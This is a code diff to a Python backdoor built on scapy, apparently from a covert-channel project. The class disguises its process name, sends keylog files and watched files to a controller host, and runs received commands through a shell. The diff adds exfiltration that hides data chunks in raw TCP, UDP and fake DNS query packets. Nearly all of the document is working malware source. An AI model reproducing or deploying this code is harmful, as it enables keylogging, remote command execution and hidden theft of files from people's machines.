@@ -1,6 +1,7 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from scapy.fields import StrField
+from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import UDP, IP, TCP
 from scapy.all import sniff, send, Raw
 from scapy.packet import Packet, bind_layers
@@ -147,7 +148,7 @@ class BackDoor:
         self.path = ""
         self.watch_status = False
         self.sequence = []
-        self.src_port = ""
+        self.file_port = ""
 
     def start(self) -> None:
         self.process_yaml()
@@ -206,7 +207,7 @@ class BackDoor:
         self.path = config['covert']['watch']
         self.client = config['covert']['client']
         self.sequence = config['share']['sequence']
-        self.src_port = config['share']['src_port']
+        self.file_port = config['share']['file_port']
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
         print(f"device is {self.device}")
@@ -217,7 +218,7 @@ class BackDoor:
         print(f"dir  is {self.watch_dir}")
         print(f"client default is {self.client}")
         print(f"seqwuence  is {self.sequence}")
-        print(f"src port  is {self.src_port}")
+        print(f"file_port  is {self.file_port}")
 
     def watch_settings(self, path) -> tuple[str, str]:
         file = path.split("/")[-1]
@@ -244,32 +245,92 @@ class BackDoor:
         # Send keylog file
         self.prepare_data(self.log)
 
-    def prepare_data(self, path: str) -> None:
+    def prepare_data(self, path: str, data=None) -> None:
         """Gets file data and sends through specified protocol"""
-        print(f"sending {path}")
-        filename = path.split("/")[-1]
-        binary_data = self.get_bin(path)
+        filename = ""
+        if path:
+            print(f"sending {path}")
+            filename = path.split("/")[-1]
+            binary_data = self.get_file_bin(path)
+        else:
+            binary_data = self.get_bin(data)
+
         if self.proto == "tcp":
             print(f"sending {self.proto}")
             self.create_tcp(binary_data, filename)
         elif self.proto == "udp":
             print(f"sending {self.proto}")
+            self.create_udp(binary_data, filename)
         else:
             print(f"sending {self.proto}")
+            self.create_udp(binary_data, filename)
+
+    def set_terminator(self, name: str) -> tuple[str, bytes]:
+        if name:
+            terminator = name.encode() + b'\x00'
+            src = self.file_port
+        else:
+            src = RandShort()
+            terminator = b'\x00'
+        return src, terminator
 
     def create_tcp(self, data: List, name: str) -> None:
         """Creates a TCP packet and embeds data in payload"""
         print("Creating TCP packets")
+        src, terminator = self.set_terminator(name)
         packets = []
         for index, byte in enumerate(data):
-            packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=byte)
+            packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=byte)
             packets.append(packet)
 
-        # Add packet to specify end of file
-        terminator = name.encode() + b'\x00'
-        packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=terminator)
+        # Add packet to specify end of msg
+        packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=terminator)
         packets.append(packet)
         self.send_pkt(packets)
+
+    def create_dns(self, data: List, name: str) -> None:
+        """Creates a DNS packet and embeds data in payload"""
+        print("Creating DNS packets")
+        src, terminator = self.set_terminator(name)
+
+        packets = []
+        dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
+        ip, udp = self.get_scapy_layers(src)
+        for index, byte in enumerate(data):
+            payload = byte
+            packet = ip / udp / dns / payload
+            packets.append(packet)
+
+        # Add packet to specify end of msg
+        payload = terminator
+        packet = ip / udp / dns / payload
+        packets.append(packet)
+        self.send_pkt(packets)
+
+    def create_udp(self, data: List, name: str) -> None:
+        """Creates a UDP packet and embeds data in payload"""
+        print("Creating UDP packets")
+        src, terminator = self.set_terminator(name)
+
+        packets = []
+        ip, udp = self.get_scapy_layers(src)
+        for index, byte in enumerate(data):
+            payload = byte
+            packet = ip / udp /  payload
+            packets.append(packet)
+
+        # Add packet to specify end of msg
+        payload = terminator
+        packet = ip / udp / payload
+        packets.append(packet)
+        self.send_pkt(packets)
+
+    def get_scapy_layers(self, port: str) -> tuple[IP, UDP]:
+        """Creates UDP and IP layer"""
+        ip = IP(dst=self.client)
+        udp = UDP(sport=port, dport=self.send_port)
+        return ip, udp
+
 
     def send_pkt(self, packets: List) -> None:
         """Sends packets"""
@@ -280,12 +341,18 @@ class BackDoor:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def get_bin(self, path: str) -> List:
+    def get_file_bin(self, path: str) -> List:
         """ Separates a file into chunks of data that can be
         sent in individual payloads
         """
         with open(path, 'rb') as f:
             data = f.read()
+            binary_data = self.get_bin(data)
+
+        return binary_data
+
+    def get_bin(self, data: bytes) -> List:
+        """ Converts sequence of bytes into byte array"""
         load_size = 1024
         binary_data = [data[i:i + load_size] for i in range(0, len(data), load_size)]
         return binary_data
@@ -313,14 +380,13 @@ class BackDoor:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def prepare_msg(self, cmd: str) -> str:
+    def prepare_msg(self, cmd: str) -> bytes:
         cipher = self.generate_cipher()
         cmd = self.flag_begin + cmd + self.flag_close
         encrypted_data = self.encrypt_data(cipher, cmd)
         # Convert the encrypted string to bytes
         print("Preparing response.....")
-        hex_str = self.get_hex_string(encrypted_data)
-        return hex_str
+        return encrypted_data
 
     def get_hex_string(self, encrypted_line):
         """ Returns hex string of byte stream (encrypted string)"""
@@ -345,7 +411,7 @@ class BackDoor:
         output = run(cmd, shell=True, capture_output=True, text=True)
         output = output.stdout
         msg = self.prepare_msg(output)
-        self.craft_packet(msg)
+        self.prepare_data("", msg)
 
     def filter_packets(self, packet) -> None:
         if self.proto == "tcp":
